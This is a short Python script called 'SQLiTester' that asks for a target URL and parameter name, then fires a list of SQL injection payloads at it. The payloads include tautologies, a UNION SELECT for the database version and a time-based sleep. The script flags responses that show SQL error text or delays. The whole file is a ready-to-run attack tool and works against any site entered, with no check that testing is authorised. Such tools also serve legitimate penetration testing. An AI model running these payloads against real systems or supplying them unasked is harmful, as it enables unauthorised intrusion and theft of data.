import requests

def test_sql_injection(target_url, param_name):
    """Test for SQL injection vulnerabilities."""
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR 1=1 --",
        "' AND 1=2 UNION SELECT null, version() --",
        "' OR sleep(5) --"
    ]
    
    print(f"Testing {target_url} for SQL Injection vulnerabilities...\n")
    for payload in payloads:
        vulnerable = False
        injected_url = f"{target_url}?{param_name}={payload}"
        print(f"Testing payload: {payload}")
        try:
            response = requests.get(injected_url, timeout=10)
            if "SQL" in response.text or "syntax" in response.text or response.elapsed.total_seconds() > 5:
                vulnerable = True
                print(f"[!] Vulnerable to SQL injection: {payload}")
        except Exception as e:
            print(f"[ERROR] Unable to test payload {payload}: {e}")
    
        if vulnerable:
            print(f"[ALERT] SQL Injection vulnerability detected with payload: {payload}")
    print("\nTesting completed.")

def main():
    print("Welcome to SQLiTester!")
    print("Automated SQL Injection vulnerability testing tool.\n")
    target_url = input("Enter the target URL (e.g., http://example.com/page): ").strip()
    param_name = input("Enter the vulnerable parameter name (e.g., id): ").strip()
    print("\nStarting SQL injection tests...\n")
    test_sql_injection(target_url, param_name)

if __name__ == "__main__":
    main()
